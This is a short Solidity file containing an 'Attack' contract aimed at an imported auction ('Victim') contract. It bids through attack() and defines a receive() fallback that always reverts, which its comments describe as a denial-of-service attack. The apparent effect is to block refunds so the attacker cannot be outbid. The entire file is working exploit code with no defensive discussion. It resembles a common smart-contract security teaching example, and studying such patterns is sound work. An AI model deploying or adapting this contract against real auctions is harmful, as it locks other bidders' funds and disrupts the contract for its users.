// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol"; // Assuming Victim.sol is imported here

contract Attack {
    // Function to trigger the attack on the victim contract
    function attack(address addr) public payable {
        // Interact with the Auction contract (Victim contract) and make a bid
        Auction(addr).bid{value: msg.value}();
    }

    // Fallback function that reverts any Ether sent to it, causing a DOS condition
    receive() external payable {
        revert("DOS attack: Reverting the transaction");
    }
}